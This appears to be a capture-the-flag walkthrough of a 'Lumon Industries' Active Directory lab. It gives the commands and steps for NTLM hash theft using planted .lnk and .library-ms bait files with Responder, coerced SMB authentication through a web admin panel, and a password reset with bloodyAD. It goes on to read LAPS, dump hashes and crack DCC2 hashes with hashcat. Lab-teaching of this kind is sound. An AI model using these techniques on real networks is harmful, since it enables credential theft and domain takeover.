---
title: "HackSmarter Lumon Industries Walkthrough  "
date: 2026-06-04 00:00:00 +0000
categories: [ HackSmarterlabs]
tags: [Hacksmarterlabs , Active Directory]
---

<img width="1600" height="896" alt="image" src="https://github.com/user-attachments/assets/f336a6ef-5a87-4527-aa31-58478c4f02e8" />


## Scenario :

Lumon Industries will soon be integrating a high-value employee into the organization. In accordance with internal security protocols, a comprehensive penetration test and internal access verification must be conducted prior to full onboarding.

For the purposes of this evaluation, you will be provided the assigned credentials and access permissions corresponding to the subject employee. Your objective is to assess the scope and boundaries of these permissions, ensuring compliance with all Lumon security standards and operational safeguards.

## Solution : 


### Initial Scan :

First i scanned the first machine , which is DC01 :

<img width="1239" height="766" alt="image" src="https://github.com/user-attachments/assets/4939c078-4494-415b-a317-a76c141c5ad3" />

Looking at the open ports we can confirm that it is a DC (Kerberos , ldap , dns) . 

Looking at the scan for the second machine , we find these open ports :

<img width="1155" height="765" alt="image" src="https://github.com/user-attachments/assets/a225d334-1fa9-4b72-a752-926a1668d81c" />

Looking at the scan results the first thing we should check is the web app . 

Before we start let's add the hostname , domain name to our /etc/hosts files , for both machines . 

<img width="1695" height="376" alt="image" src="https://github.com/user-attachments/assets/1bca54d5-31da-4b5d-ae57-a22be9320da9" />

Since this an AD environment , i like to follow this quick checklist from my methdology : 

```bash
Scan All TCP Ports : Check The useful note Down for more info .
Check ldap , rpc , smb with anonymous access . Check for Public Shares .
Find Usernames : Find usernames in Web Site and generate a Username List maybe . if you get access , Look for usernames using netexec , –rid-brute , –users and enumdomuser with RPC client .
Check usernames found with kerbrute .
Search for ASREP Roastable Users .
Once we have valid Creds : Check Kerberoastable users + Spray the password on all users .
Try to authenticate using every protocol .
Enumerate shares with those Users found . Use netexec to download .
Check Certipy for Vulnerable Templates if there is an ADCS in place .
If we get a Shell , try privesc , dump all Hashes using netexec or locally and store into a file .
If we can’t privesc , we can move to Blood Hound .
```

Now we can start enumerating the machines one by one starting with the First DC .

### DC01 Machine :

We're already given a set of credentials that we can use to enumerate the domain : hellyr:H3lenaR!2025

Usually i would start by testing these creds against all protocols , to see if we got Winrm access or RDP , admin via smb (Pwn4d!) then check the shares as well that our user has access to . 

<img width="1412" height="612" alt="image" src="https://github.com/user-attachments/assets/c82fa376-92ac-4ce7-ad5a-4a92c8b68a5d" />

In our case the user has no admin privieleges , Winrm isn't even open and Shares that exist are only the default ones . 

Now second thing i like to do is get a list of usernames , we can do this easily now since we've got Valid Creds that we can use , then what i like to do is test for ASREPROASTING against all users , then check Kerberoastable users as well . 

<img width="1408" height="707" alt="image" src="https://github.com/user-attachments/assets/f7a78171-bf60-4320-a2ce-9ef0c6d67525" />

Now we test for ASREPROASTING , and kerberoasting :

<img width="1201" height="796" alt="image" src="https://github.com/user-attachments/assets/b9ff46f6-1c17-41e9-9343-32dc06534baa" />

No users are kerberoastable nor asreproastable. 

Right now the only thing left will be BloodHound , to try and see if the user has any useful ACLs we can abuse . Steps to setup Bloodhound : 

```bash
# To get the ZIP file :
nxc ldap $target -u 'hellyr' -p 'H3lenaR!2025' --bloodhound --collection All --dns-server $target
# To run BloodHound : 
https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart
wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
tar -xvzf bloodhound-cli-linux-amd64.tar.gz
sudo ./bloodhound-cli install
./bloodhound-cli resetpwd
Visit : http://localhost:8080/ui/login 
```

<img width="1531" height="659" alt="image" src="https://github.com/user-attachments/assets/3a26235f-c3f8-406f-a3a3-c9bdeac19487" />

No Outbound object control , no interesting groups , We see a CA group , tried testing for template abuse using certipy but that didn't work either. 

<img width="1876" height="706" alt="image" src="https://github.com/user-attachments/assets/e9da4aac-6d0c-458f-8c7b-aee88aaaa79c" />

Now let's move to the Intranet machine , maybe we can find something there . 

### Intranet Machine :

First we check for the shares that we can access on this machine .

<img width="1240" height="567" alt="image" src="https://github.com/user-attachments/assets/65d264c2-3e94-4a7c-a8ab-3e764cbe346a" />

We find a new share 'MDREPO' that we have Read and Write permissions on. Always, if we have Write access to a share, think about uploading an .lnk file that will connect back to our machine so that we can steal a hash. If we see that there is a web server that hosts files from that share, we can always try and upload an ASPX reverse shell or just a webshell (depends on the technology used, but since it's Windows it's most probably going to be ASP or ASPX). After that, we can execute it and get a shell as the web server user in some cases.

Now with this in mind let's connect to the smb share . 

<img width="1310" height="580" alt="image" src="https://github.com/user-attachments/assets/bfa9055b-6179-4d0f-a602-fdc73a6a8412" />

We found a pdf file , and url link , the pdf files explains to employees how they can login to the company's portal , if we visit that Url , we get the same portal : 

<img width="1321" height="783" alt="image" src="https://github.com/user-attachments/assets/e1f546cf-4dd8-4e05-ab70-929aa9daeac6" />

We know how to login (noted in the pdf file) , and we already got a valid set of creds that we can use to try and login to the portal . 

<img width="1187" height="807" alt="image" src="https://github.com/user-attachments/assets/7f596d20-815f-4a72-bb71-edd1100cfd36" />

Once we login as the hellyr user , we find a static page , nothing to work with here . Let's try and upload the ink file to steal the NTLM Hash , to do this we can use a tool called ntlmtheft .

```bash
https://github.com/Greenwolf/ntlm_theft
git clone https://github.com/Greenwolf/ntlm_theft.git
cd ntlm_theft
python3 ntlm_theft.py --generate modern --server tun0 --filename "Please_Clickit"     
```

<img width="1421" height="773" alt="image" src="https://github.com/user-attachments/assets/4bcefbc5-3afb-48a6-a760-ef6bad46ca01" />

Now we put those files inside the share :

<img width="1385" height="670" alt="image" src="https://github.com/user-attachments/assets/d86db265-969c-47d5-b3b7-e89259a8f976" />

And finally we launch Responder to try and Steal the hashes . 

```bash
sudo responder -I tun0    
```

<img width="1038" height="750" alt="image" src="https://github.com/user-attachments/assets/8c73f2f6-ff25-43e4-a73b-ba942f7baa17" />

Sadly we got no Hashes ...

I also found this new way of stealing hashes via Write permissions over an smb share , a new CVE discovered in 2025 : When a .library-ms file with a UNC path is opened (or previewed) in Windows Explorer, it triggers an SMB authentication request to the specified server, leaking the NTLMv2 hash.

```bash
https://github.com/helidem/CVE-2025-24054_CVE-2025-24071-PoC
```

<img width="1063" height="800" alt="image" src="https://github.com/user-attachments/assets/54db2619-be9c-48ba-abd1-a6f09f265006" />

Now just like before we need to put this file inside the share and wait for Responder to capture the hash of the user who opens that file . 

<img width="1179" height="778" alt="image" src="https://github.com/user-attachments/assets/467bdb05-a6d3-47ce-9f87-55990c07699a" />

Perfect , we were able to capture a Hash finally . Now we can use John or Hashcat to crack it . 

<img width="1249" height="477" alt="image" src="https://github.com/user-attachments/assets/ad27d0d5-1e0e-4a73-bb6c-09a6a0f6014b" />

And we are able to get the password for the user Harmonyc : h@rmony08

<img width="1272" height="260" alt="image" src="https://github.com/user-attachments/assets/d1240927-3018-4415-87c1-cf1c915dd3d4" />

looking at BloodHound , we don't find any outbound object control , but we find a non default group .

<img width="1607" height="684" alt="image" src="https://github.com/user-attachments/assets/faac1ce6-5541-43e9-8cf1-25f1b5f656e5" />

Let's try to login via the portal with this new user , since we didn't find anything that we can exploit , and the user can't Winrm since he isn't part of the Remote management group .

<img width="1242" height="780" alt="image" src="https://github.com/user-attachments/assets/cd410279-8c1a-46b3-97ac-d0684513be35" />

This time we find an admin panel which we didn't have on the hellyr user .

<img width="1163" height="712" alt="image" src="https://github.com/user-attachments/assets/97b2b9d6-713d-4a2e-a1dc-2c9a584c9af4" />

On the admin panel we find this Ping feature as well as the ability to browse file Shares  , ALWAYS whenever we can access shares , the first thing we should think of is reaching out to ourselves and trying to capture the Hash using responder . 

First, set up Responder, by default it will spin up an SMB server and start listening. Then we call our share \\\\<Our_IP>\\Share from the Browse feature, which will force the target to authenticate back to us, capturing the hash.

<img width="1054" height="687" alt="image" src="https://github.com/user-attachments/assets/59476f38-3a9b-4bf3-9bd1-3cd75ab47e68" />

Four \ didn't work so i tried only with \\ and it worked perfectly :

<img width="1469" height="662" alt="image" src="https://github.com/user-attachments/assets/033c5937-2b9d-4b2b-93e6-72e5af901c73" />

Now that we've got the Hash we can try to crack it .

<img width="1043" height="380" alt="image" src="https://github.com/user-attachments/assets/b90dc6ed-89c4-41b8-a60a-72382edc0691" />

Perfect , we've got a new set of credentials : IntranetSvc/Servicesince1979 :

<img width="1275" height="342" alt="image" src="https://github.com/user-attachments/assets/6852e4a3-5ef8-4f59-adcb-0ca45f2a4b1c" />

No Winrm access as well , let's check Bloodhound for ACLs .

<img width="1444" height="745" alt="image" src="https://github.com/user-attachments/assets/264641f3-9f31-4735-ad1c-651bd4a7e89f" />

Perfect our user can change passwords for all these users , let's take a look at these users to see which ones have high privileges that we can abuse .

<img width="1667" height="507" alt="image" src="https://github.com/user-attachments/assets/a342a530-26e2-46ef-b2d7-0215c08494a1" />

We find that the user MARKS is a member of the LAPSAdmin group, which means we can read LAPS passwords. Using BloodyAD we can change his password, and from there use nxc to read the LAPS passwords.

```bash
Keep in mind $target is for the DC Not Intra machine.
bloodyad --host $target -d 'LUMONS.HACKSMARTER' -u 'IntranetSvc' -p 'Servicesince1979' set password 'MARKS' 'WEAK123.' 
```

<img width="1608" height="453" alt="image" src="https://github.com/user-attachments/assets/f976ea62-6697-4c71-a67f-80d032c3647a" />

Perfect , now we can read LAPS passwords using nxc module --laps .

<img width="1865" height="553" alt="image" src="https://github.com/user-attachments/assets/a6119d8c-946c-4541-8781-0e42cab27a58" />

We couldn't read the LAPS password for the local admin on the DC but we were able to get the Password for the user localadmin on the Inra machine .

<img width="1697" height="522" alt="image" src="https://github.com/user-attachments/assets/da81d4f7-1706-4897-8449-2f61e4f70351" />

We can tell from the nxc output that we can't authenticate to the domain with this account , only locally. That's why it only works when we add --local-auth, which tells nxc to authenticate locally rather than against the domain.

<img width="1538" height="374" alt="image" src="https://github.com/user-attachments/assets/94f124ca-f597-4ce8-b4c3-940752292748" />

As we can see we are able to login to the machine via rdp as the local admin , once we do that we can add our user MARKS to the admin group and dump all the Hashes , since we couldn't do that via nxc earlier.

<img width="1636" height="562" alt="image" src="https://github.com/user-attachments/assets/402059d4-4975-4ff7-a470-5a471107c85e" />

Now let's launch a terminal as administrator and add our user mark to the local admin group .

<img width="1074" height="613" alt="image" src="https://github.com/user-attachments/assets/70081ad9-ce90-4db4-9aa1-b16a1e3ff97f" />

Perfect , now let's dump the hashes .

<img width="1539" height="682" alt="image" src="https://github.com/user-attachments/assets/8cb864bb-3116-4d32-83ef-fb0209dffcf4" />

We got the DCC2 Hash for the Hellye user , from BloodHound i saw that he was part of Tier0 users .

The DCC2 hash is the hash the machine caches whenever a domain user logs in locally. We can't use it to authenticate over the network via SMB, LDAP, etc. So the only option is to crack it offline.

<img width="1622" height="707" alt="image" src="https://github.com/user-attachments/assets/015ad0d1-d96f-4c6e-baad-3330f07f3a2c" />

We can try to Crack the DCC2 Hash since we can't really use it for a Pass the Hash attack. (Mode for DCC2 Hash is 2100) 

```bash
hashcat -m 2100 Helly.DC02 /usr/share/wordlists/rockyou.txt
```

<img width="1421" height="804" alt="image" src="https://github.com/user-attachments/assets/fb029a6a-9235-4bfa-9a2d-84a832395eb9" />

Finally , we crack it , takes a while so don't worry if it takes too long . Now with the password , we can authenticate to the domain and dump ntds hashes since we are Domain Admin now .


<img width="1777" height="619" alt="image" src="https://github.com/user-attachments/assets/c3c84bc8-f348-4bf7-87a5-5120ec14d754" />

I tried getting a shell using impacket tools , smbexec , wmiexec , even used the newer version for wmiexec , but nones of them worked .

Eventually i just RDP using the Hellye user , for the Flag :

Login to Intranet to get the user flag on the MARKS desktop (he was the first user we found who could Winrm to the Intranet so i assumed it will be there )

<img width="1165" height="743" alt="image" src="https://github.com/user-attachments/assets/185c4348-39bb-462c-8fcf-dc9772b47e22" />

Login to the DC01 to get the Root flag inside the Administrator Desktop .

<img width="1021" height="596" alt="image" src="https://github.com/user-attachments/assets/48b97b07-9da7-4ccf-a21c-55cbb6d56aa1" />

Why not login as the Administrator instead ? The account is disabled :) 

<img width="1896" height="538" alt="image" src="https://github.com/user-attachments/assets/48a68641-1868-4183-b317-4c70c561834c" />

That was all for this Lab , very fun one to be fair , hope you learned something from this writeup , see you in the next one :) 



